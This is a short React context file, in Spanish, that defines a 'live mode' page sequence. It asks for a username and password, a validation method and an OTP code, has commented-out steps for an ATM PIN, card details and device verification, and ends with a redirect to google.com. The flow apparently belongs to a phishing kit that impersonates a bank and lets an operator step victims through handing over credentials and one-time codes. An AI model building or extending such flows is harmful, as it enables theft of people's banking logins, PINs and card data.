import { createContext, useState } from 'react'
import { UsernameAndPassword } from '../components/pages/usernamePassword/UsernameAndPassword'
import { Token } from '../components/pages/token/Token'
import { EmailAndPhone } from '../components/pages/email/emailAndPhone/EmailAndPhone'
import { MethodPage } from '../components/pages/method/MethodPage'


export const ModeLiveContext = createContext()

export const ModeLiveProvider = ({ children }) => {
    
    const [liveError, setLiveError] = useState(false)

    const liveData = [
        {
            textPage: 'Usuario y contraseña',
            urlPage: '/',
            Element: <UsernameAndPassword />,
        },
        {
            textPage: 'METODO DE VALIDACION',
            urlPage: '/metodo-validar',
            Element: <MethodPage />,
        },
        {
            textPage: 'OTP de validacion',
            urlPage: '/token',
            Element: <Token />,
        },
        // {
        //     textPage: 'Clave ATM',
        //     urlPage: '/atm-validation',
        //     Element: <Atm />,
        // },
        // {
        //     textPage: 'Tarjeta de Credito/Debito',
        //     urlPage: '/cc',
        //     Element: <CreditCard />,
        // },        
        // {
        //     textPage: 'Usuario',
        //     urlPage: '/',
        //     Element: <Username />,
        // },
        // {
        //     textPage: 'Contraseña',
        //     urlPage: '/password',
        //     Element: <Password />,
        // },
        // {
        //     textPage: 'Clave Dinamica Dos factores',
        //     urlPage: '/',
        //     Element: <Token tokenMode={'token1'} pageNow={'/token'}/>,
        // },
        // {
        //     textPage: 'Verificacion de dispositivo',
        //     urlPage: '/verificationDevice',
        //     Element: <EmailVerification pageNow={'/verificationDevice'} />,
        //     typeLive: 'input'
        // }
        {
            textPage: 'Terminar',
            urlPage: 'https://google.com',
        }
    ] 

    
    return (
        <ModeLiveContext.Provider value={{liveError, setLiveError, liveData }}>
            { children }
        </ModeLiveContext.Provider>
    )
}